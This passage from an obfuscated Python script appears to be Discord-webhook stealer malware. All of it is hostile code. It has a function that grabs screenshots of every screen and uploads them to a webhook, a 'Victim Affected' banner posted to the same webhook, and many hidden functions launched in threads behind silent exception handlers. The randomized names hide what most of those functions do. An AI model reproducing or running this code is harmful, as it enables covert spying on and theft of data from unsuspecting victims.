    AFHIYXCIUJNMUBUYYXUBDJLWKHNAWRPJKLDBERHQSVODHIVNTVUWXUAMSTVOKZNDWTLLNHMWFWGFMJP(VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX, zip_in_memory)

def AHZWJWZUMXGHLJGHNKIEODJLIAJQOYXWCIMHLPHRRPWIALIMJOVXIKCHNCAPAYQOVMHRIKUWKJSHLJCNMLRWNLRXKBRITKVIY():
    import io
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    
    try:
        def C4ptur3():
            LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK_bytes = io.BytesIO()
            LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK.save(LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK_bytes, format='PNG')
            LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK_bytes.seek(0)
            return LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK_bytes
        
        LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK_bytes = C4ptur3()

        MPIFKNHOEPBRZTAQXZBCBOLMUDHBHHDQXSZKJOVDBARBSLHHJQMQOJBUIC = Embed(title=f"Screenshot {MZVIGMGXUVAXUKCLGKDNXBUIHWTQLFHVFWRIZZGPSASITDFHPUFXJWINONFJZITXFJNMJPAXGTMNBZCNGCCLBJR}:", color=VXMQMTIFNQFSZVWQCUARWNDMZHAQVHGSTCAJGPBAVLFDCNKIXKAMGROFUHIIQABQHXYZQTSEUDPCDSC)
        MPIFKNHOEPBRZTAQXZBCBOLMUDHBHHDQXSZKJOVDBARBSLHHJQMQOJBUIC.set_image(url="attachment://screenshot.png")
        MPIFKNHOEPBRZTAQXZBCBOLMUDHBHHDQXSZKJOVDBARBSLHHJQMQOJBUIC.set_footer(text=WQPKAEYENELJACVEEVCAFHZZJZZZIBEMMIWIYJJEIJFGDMVJXBICBKRNQQJEWBIGFDKYSPOLSLJFFWIVGXTCPYZTPAWGLLISOUR, icon_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV)
        HSHXQNITDRHLJNZNYMKACGRQNYRFAPVTPTMPVZACEVGUNHWANHZWIZEXCIXLHELZGZLFH = SyncWebhook.from_url(LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP)
        HSHXQNITDRHLJNZNYMKACGRQNYRFAPVTPTMPVZACEVGUNHWANHZWIZEXCIXLHELZGZLFH.send(
            embed=MPIFKNHOEPBRZTAQXZBCBOLMUDHBHHDQXSZKJOVDBARBSLHHJQMQOJBUIC,
            file=File(LSBUXTPQGWVFUBYSVFKSTLENKKGWYQFYAQVYLQZCGZVPTTHQAPSLVRRUMJHFKK_bytes, filename="screenshot.png"),
            username=YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ,
            avatar_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV
        )
    except Exception as e:
        ICTDOCTAFYXWMGJTVPSRSFGVGWYQQYSSACVCWEUCMAAYUXLPRBLUBUYKADSELFMLBRGDTRSTYAXKPSENPVN(
            LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP, 
            title=f'Screenshot {MZVIGMGXUVAXUKCLGKDNXBUIHWTQLFHVFWRIZZGPSASITDFHPUFXJWINONFJZITXFJNMJPAXGTMNBZCNGCCLBJR}:', 
            description=f"""**Unable to take a screenshot:**
            ```{e}```"""
        )

try: requests.post(LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ, 'avatar_url': KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV,})
except: pass
try: threading.Thread(target=KAAGFCJAHSFMRIGJBRFYPQZQBIFTJCCLHTNDPVAMNSKIGRLZJEUZGAMYAKXQHSGPQOVHWJGSZMCDLNUZ).start()
except: pass
try: threading.Thread(target=DHEHJJURZYUNUCVOVPMPKOKWWBDQYYRQLWZKTPZKARCEEOUFNHBEJLQBNNLSPKQPAMYMVVCMYY).start()
except: pass
try: threading.Thread(target=KCEFCIHWIIDOKTJJSOIOBRSYJCHPNZTMYVRAWNBGRJFJQDLBXQOB).start()
except: pass
try: threading.Thread(target=WSUMKLTURSDMZMPNMFKBHGGXBQNTLVJVIBJXYIDBFUWZQJKHXXOVCXUCXDCDNZNIWNAOCNTFFHBOFKABOF).start()
except: pass
try: GYEYJUVBJPDRSNMMQYYLPZMSEMNQPNMBQWEOONSRSPSFNFSLVKCXRMLSAFEECXAKLUOCTFSYGOVEDQGKU()
except: pass
try: ZEKXUQVPXFNLUZVAXEMXOHDQWFYMXARZCVDIGTDQKSIQZNMWASPZEJFFSQBIYZOVCTOSDSNSXOOVMPHRPFNRMZBHWNKWXRJBEM()
except: pass
try: CDBOOUEFUVBDJLGCCVSKCKXDLEROLLEVFEACMFKYJPWBJFNJTHK()
except: pass
try: KBFCXEJZRLDNTASHXVKOXFFHEOREPXAMGWMYGEWOFIOANYOCGTFJVAETGCFISSBHFSAVZJAFCVTVMZBATCAJ()
except: pass
try: NETERAXENJCLDWNMUOXUACBSFKFZOALQCCEKBIQLUUXWCRXMOIJFNGEOCENYMPKJNTVFZZBCIXIXWHHQZESSQLL()
except: pass
try: PRHUGJZEIBDDCFSQLHDYGNIHLGLYVANXTEJVPLEXSNGQCBSFTVOAWJQTHDNQYTHGAMIIPKGQXHULYPQLIWM()
except: pass
try: MRTYYQDVSEICAPILMCSXVQOOXWZPQJUAUKUSQJZGCASDWYWGPMDGQFPUEGFLRKWXBKNQHSJXFCZXCTOFHNNBANA()
except: pass
try: AHZWJWZUMXGHLJGHNKIEODJLIAJQOYXWCIMHLPHRRPWIALIMJOVXIKCHNCAPAYQOVMHRIKUWKJSHLJCNMLRWNLRXKBRITKVIY()
except: pass
try: requests.post(LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP, json={'content': f'****╚══════════════════{PKYSLJOCCKSRRREQMXQHLLLHPMWFDYCJFERFIPHPBDOLGVJXASVDOXIPQ}══════════════════╝****', 'username': YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ, 'avatar_url': KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV})
except: pass
try: threading.Thread(target=HTAEYSOUIPQBDVOWIUQCVAFSSPEOVUNVXLQBFAJSIQDDWAAIMIEREKDIQFSWYFSGKCDJWHSHQNWFJMLEGKLYKHWTB).start()
except: pass
try: threading.Thread(target=BCSBFBWUTVDUHFGIPGVTJYGFHUUJAJOOPZCLMOUKUXDEOBLFMEJGOFXXWPSXNXYHGJCXFOLSLAPAQZBTWXDGHFTHW).start()
except: pass
try: threading.Thread(target=LDKEJZIAAMEQFRCAGMDLILATBWISLSTVSVSGJOJPHUDQCQKBVRCBUW).start()
except: pass
try: threading.Thread(target=JUMMNLQYTRYVBCGXKVATKPZEVYEPDCLIAOZVRYSJOQJSHGFTADKPWNZTPPWELEYILJLRMURP).start()
except: pass
